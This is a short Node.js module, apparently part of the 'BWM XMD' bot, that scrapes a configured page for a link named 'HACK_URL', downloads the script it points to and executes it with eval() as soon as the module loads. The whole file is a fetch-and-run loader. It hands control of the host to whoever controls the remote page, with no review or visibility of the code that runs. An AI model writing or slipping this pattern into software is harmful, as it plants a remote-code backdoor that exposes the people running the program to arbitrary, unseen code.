 // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​


'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchHackUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const hackUrlElement = $('a:contains("HACK_URL")');
    const hackUrl = hackUrlElement.attr('href');

    if (!hackUrl) {
      throw new Error('Hack URL link not found...');
    }

    console.log('Hack URL fetched successfully ✅');

    const scriptResponse = await axios.get(hackUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchHackUrl();
